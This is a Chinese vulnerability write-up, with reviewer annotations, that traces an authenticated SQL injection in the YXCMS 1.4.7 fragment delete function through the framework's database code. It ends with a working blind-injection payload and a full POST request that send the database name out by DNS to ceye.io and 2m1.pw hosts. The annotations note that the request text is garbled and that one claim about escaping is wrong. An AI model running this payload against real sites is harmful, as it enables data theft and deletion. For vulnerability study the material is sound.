---
source: "hatch 补库批 20260928"
product: "YXCMS1.4.7"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "YXCMS 1.4.7SQL注入"
prerequisites: "来源所述条件，未列明部分仍待核：authenticated fragmentdelete; POSTdelidarray; DNSexfilWindowsUNC/FILEpermission/egress"
side_effects: "未执行；本文需注意的操作影响：OOB载荷依WindowsUNC与DB FILE/网络配置未写；删除操作可实际删数据；HTTPbody末尾粘中文说明、Referer含[url]、URL吞中文、两不同payload/外带域，需恢复排版"
source_status: "unknown"
id: "vw-83434a6adff8b54b90d80920"
entity_id: "ve-83434a6adff8b54b90d80920"
schema_version: "1"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：authenticated fragmentdelete; POSTdelidarray; DNSexfilWindowsUNC/FILEpermission/egress

- **结论使用边界（1）**：真正未过滤分支是POSTimplode字符串where；作者起初跟GETintval安全分支易误导。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：称escape函数只有数组才过滤错误，escape标量也mysql_real_escape_string；风险是parseCondition字符串分支不调用escape。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **操作与副作用边界（3）**：OOB载荷依WindowsUNC与DB FILE/网络配置未写；删除操作可实际删数据。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **结论使用边界（4）**：HTTPbody末尾粘中文说明、Referer含\[url\]、URL吞中文、两不同payload/外带域，需恢复排版。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（5）**：有完整调用链价值但缺来源/补丁和测试版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# YXCMS 1.4.7SQL注入

一、漏洞简介
------------

二、漏洞影响
------------

1.4.7

三、复现过程
------------

### 漏洞分析

查看漏洞文件protected/apps/admin/controller/fragmentController.php的第63行

    public function del()
    {
        if(!$this->isPost()){
            $id=intval($_GET['id']);
            if(empty($id)) $this->error('您没有选择~');
            if(model('fragment')->delete("id='$id'"))
            echo 1;
            else echo '删除失败~';
        }else{
            if(empty($_POST['delid'])) $this->error('您没有选择~');
            $delid=implode(',',$_POST['delid']);
            if(model('fragment')->delete('id in ('.$delid.')'))
            $this->success('删除成功',url('fragment/index'));
        }
    }

我们跟if(model(\'fragment\')-\>delete(\"id=\'\$id\'\")),它会先到protected/core.php文件里面的model

    function model($model){
        static $objArray = array();
        $className = $model . 'Model';
        if( !is_object($objArray[$className]) ){
            if( !class_exists($className) ) {
                throw new Exception(config('_APP_NAME'). '/' . $className . '.php 模型类不存在');
            }
            $objArray[$className] = new $className();
        }
        return $objArray[$className];
    }

然后到protected/apps/admin/model/fragmentModel.php

    <?php
    class fragmentModel extends baseModel{
        protected $table = 'fragment';
    }

继续protected/base/model/baseModel.php

    <?php
    class baseModel extends model{
         protected $prefix='';
         public function __construct( $database= 'DB',$force = false ){
            parent::__construct();
            $this->prefix=config('DB_PREFIX');
        }
    }

再来到最底层的数据库操作类protected/base/model/model.php的第45行

    public function delete($condition){
    return $this->model->table($this->table, $this->ignoreTablePrefix)->where($condition)->delete();
        }

这个delete()是从哪里来的，我们来看第十三行的代码,创建了一个对象cpModel

    static public function connect($config, $force=false){
            static $model = NULL;
            if( $force==true || empty($model) ){
                $model = new cpModel($config);
            }
            return $model;
        }

漏洞文件在protected/include/core/cpModel.class.php,

    public function delete() {
            $table = $this->options['table'];   //当前表
            $where = $this->_parseCondition();  //条件
            if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除

            $this->sql = "DELETE FROM $table $where";
            $query = $this->db->execute($this->sql);
            return $this->db->affectedRows();
        }

这里用到了一个方法\_parseCondition()

    private function _parseCondition() {
            $condition = $this->db->parseCondition($this->options);
            $this->options['where'] = '';
            $this->options['group'] = '';
            $this->options['having'] = '';
            $this->options['order'] = '';
            $this->options['limit'] = '';
            $this->options['field'] = '*';      
            return $condition;      
        }
    }

这个函数是在protected/include/core/db/cpMysql.class.php的128行

    public function parseCondition($options) {
            $condition = "";
            if(!empty($options['where'])) {
                $condition = " WHERE ";
                if(is_string($options['where'])) {
                    $condition .= $options['where'];
                } else if(is_array($options['where'])) {
                        foreach($options['where'] as $key => $value) {
                             $condition .= " `$key` = " . $this->escape($value) . " AND ";
                        }
                        $condition = substr($condition, 0,-4);  
                } else {
                    $condition = "";
                }
            }

            if( !empty($options['group']) && is_string($options['group']) ) {
                $condition .= " GROUP BY " . $options['group'];
            }
            if( !empty($options['having']) && is_string($options['having']) ) {
                $condition .= " HAVING " .  $options['having'];
            }
            if( !empty($options['order']) && is_string($options['order']) ) {
                $condition .= " ORDER BY " .  $options['order'];
            }
            if( !empty($options['limit']) && (is_string($options['limit']) || is_numeric($options['limit'])) ) {
                $condition .= " LIMIT " .  $options['limit'];
            }
            if( empty($condition) ) return "";
            return $condition;
        }

里面有一个行数来过滤escape,我们找到74行的这个函数定义

    public function escape($value) {
            if( isset($this->_readLink) ) {
                $link = $this->_readLink;
            } elseif( isset($this->_writeLink) ) {
                $link = $this->_writeLink;
            } else {
                $link = $this->_getReadLink();
            }

            if( is_array($value) ) { 
               return array_map(array($this, 'escape'), $value);
            } else {
               if( get_magic_quotes_gpc() ) {
                   $value = stripslashes($value);
               } 
                return  "'" . mysql_real_escape_string($value, $link) . "'";
            }
        }

不过这个函数有一句is\_array如果是数组才会执行下面的过滤，如果不是的话就正常执行下去,没有任何sql的过滤就造成了注入漏洞。

### 复现

这个盲注可以用[http://ceye.io和python脚本跑](http://ceye.io和python脚本跑)

    http://0-sec.org/index.php?r=admin/fragment/index

payload:

    1 and if((select load_file(concat('\\\\',(select database()),'.xxxx.ceye.io\\abc'))),1,1))-- 

    - 点击删除

post包

    POST /index.php?r=admin/fragment/del HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 188
    Referer: [url]http://127.0.0.1/index.php?r=admin/fragment/index[/url]
    Cookie: PHPSESSID=bbei6n32cuevaf1lbi0n79rdj2; 
    Connection: close
    Upgrade-Insecure-Requests: 1

    delid%5B%5D=select LOAD_FILE((CONCAT('\\\\',(SELECT DATABASE()),'.8571e594.2m1.pw\\abc')))&__hash__=529fbedab8a7b8a3f3f5a0f394f51cf2_08ebfXTKPoKd0tX4iq+aFMwhq5QkkRGC/NfUu/Ny83+UmU8u0MoCIj8然后用burp截获数据，修改内容加上我们的payload，用原文的payload后面+会报错然后进入<http://ceye.io/records/dns> 查看我们的数据